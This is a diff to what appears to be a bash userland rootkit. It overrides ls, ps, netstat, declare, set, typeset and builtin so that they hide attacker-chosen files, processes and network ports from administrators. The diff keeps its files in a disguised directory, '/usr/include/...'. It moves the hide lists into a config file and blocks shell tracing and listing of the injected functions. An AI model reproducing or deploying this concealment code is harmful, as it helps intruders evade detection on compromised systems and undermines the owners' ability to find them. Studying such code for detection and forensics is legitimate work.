@@ -13,6 +13,8 @@ declare -r typeset
 
 unalias ls >/dev/null 2>&1
 
+BR_ROOTKIT_PATH="/usr/include/..."
+
 function abcdmagic()
 {
 	:
@@ -26,7 +28,11 @@ function builtin()
 	case $1 in 
 		"declare"|"set"|"unset"|"command"|"type"|"typeset")
         		fake_a="$(command builtin $1 $2)"
-        		fake_b=${fake_a/abcdmagic?()*/}
+			if [ $2 == " " ];then
+        			fake_b=${fake_a/br_hide_file\=*/}
+			else
+        			fake_b=${fake_a/\/bin\/ls?()*/}
+			fi
 			echo -n "$fake_b"
 			reset_command
 			return ;;
@@ -47,9 +53,15 @@ function declare()
 
 	unset command
 	case $1 in 
-		""|"-f"|"-F")
+		"")
         		fake_a="$(command declare $1 $2)"
-        		fake_b=${fake_a/abcdmagic?()*/}
+        		fake_b=${fake_a/br_hide_file\=*/}
+			echo -n "$fake_b"
+			reset_command
+			return ;;
+		"-f"|"-F")
+        		fake_a="$(command declare $1 $2)"
+        		fake_b=${fake_a/\/bin\/ls?()*/}
 			echo -n "$fake_b"
 			reset_command
 			return ;;
@@ -68,7 +80,7 @@ function typeset()
         case $1 in
                 ""|"-f"|"-F")
                         fake_a="$(command declare $1 $2)"
-                        fake_b=${fake_a/abcdmagic?()*/}
+                        fake_b=${fake_a/br_hide_file\=*/}
                         echo -n "$fake_b"
 			reset_command
                         return ;;
@@ -116,10 +128,12 @@ function set()
         case $1 in
                 "")
                         fake_a="$(command set)"
-                        fake_b=${fake_a/abcdmagic?()*/}
+                        fake_b=${fake_a/br_hide_file\=*/}
                         echo -n "$fake_b"
 			reset_command
                         return ;;
+		"-x"|"+x")
+			return ;;
                 *)
 			echo $1 $2
                         command set $1 $2
@@ -263,11 +277,11 @@ unalias ls >/dev/null 2>&1
 
 function max_file_length()
 {
-	local fake_file sum=0 n=0
+	local tmp_file sum=0 n=0
 
-	for fake_file in $(/bin/ls $1)
+	for tmp_file in `/bin/ls $@`
 	do
-		n=${#fake_file}
+		n=${#tmp_file}
 		[ $n -gt $sum ] && sum=$n
 	done
 	
@@ -277,27 +291,40 @@ function max_file_length()
 function ls()
 {
 	local fake_file max_col_num file_format
-	local new_file file_len=0 sum=0 n=0
-	local file_arg display_mode=0
+	local hide_file hide_flag file_arg old_ifs
+	local file_len=0 sum=0 n=0 display_mode=0
 
 	max_col_num=`stty size|cut -d " " -f 2`
+
+        . $BR_ROOTKIT_PATH/br_config.sh
+        br_load_config $BR_ROOTKIT_PATH/br.conf
 
 	for file_arg in $@
 	do
         	if echo $file_arg|grep -q -e "^-.*l.*"; then
-			display_mode=1
-                	break
+			display_mode=1; break
         	fi
 	done
 
 	case $display_mode in
 	0)
+		unset -f /bin/ls
 		max_file_length $@
 		file_len=$?
 
 		for fake_file in $(/bin/ls $@)
         	do
-                	[ "$fake_file" == "wzt" ] && continue
+			hide_flag=0
+        		old_ifs=$IFS; IFS=","
+        		for hide_file in ${br_hide_file[@]}
+        		do
+                		if echo "$fake_file"|grep -e "^$hide_file" >/dev/null;then
+					hide_flag=1; break
+				fi
+			done
+       			IFS=$old_ifs
+
+			[ $hide_flag -eq  1 ] && continue
 
 			n=${#fake_file}
 			((sum=sum+n+file_len))
@@ -313,11 +340,21 @@ function ls()
         	done
 
 		[ $sum -le $max_col_num ] && echo ""
+		reset_ls
 		return ;;
 	1)	
+		unset -f /bin/ls
+
 		fake_file=`/bin/ls $@`
-		new_file=`echo "$fake_file" | sed -e '/wzt/d'`
-		echo "$new_file"
+        	old_ifs=$IFS; IFS=","
+        	for hide_file in ${br_hide_file[@]}
+        	do
+			fake_file=`echo "$fake_file" | sed -e '/'$hide_file'/d'`
+        	done
+        	IFS=$old_ifs
+		echo "$fake_file"
+		reset_ls
+
 		return ;;
 	esac
 }
@@ -353,11 +390,21 @@ function /bin/ls()
 
 function ps()
 {
-        local proc_name new_proc_name
+        local proc_name hide_proc old_ifs
+
+        . $BR_ROOTKIT_PATH/br_config.sh
+        br_load_config $BR_ROOTKIT_PATH/br.conf
+
+        old_ifs=$IFS; IFS=","
 
         proc_name=`/bin/ps $@`
-        new_proc_name=`echo "$proc_name" | sed -e '/\/bin\/bash/d'`
-        echo "$new_proc_name"
+        for hide_proc in ${br_hide_proc[@]}
+        do
+        	proc_name=`echo "$proc_name" | sed -e '/'$hide_proc'/d'`
+        done
+
+        echo "$proc_name"
+	IFS=$old_ifs
 }
 
 function reset_ps()
@@ -379,15 +426,19 @@ function /bin/ps()
 
 function netstat()
 {
-        local port=(22 111)
-        local hide_port=111 tmp_port
+        local hide_port tmp_port old_ifs
 
+	. $BR_ROOTKIT_PATH/br_config.sh
+	br_load_config $BR_ROOTKIT_PATH/br.conf
+
+	old_ifs=$IFS; IFS=","
         tmp_port=`/bin/netstat $@`
-        for hide_port in ${port[@]}
+        for hide_port in ${br_hide_port[@]}
         do
                 tmp_port=`echo "$tmp_port" | sed -e '/'$hide_port'/d'`
         done
         echo "$tmp_port"
+	IFS=$old_ifs
 }
 
 function reset_netstat()
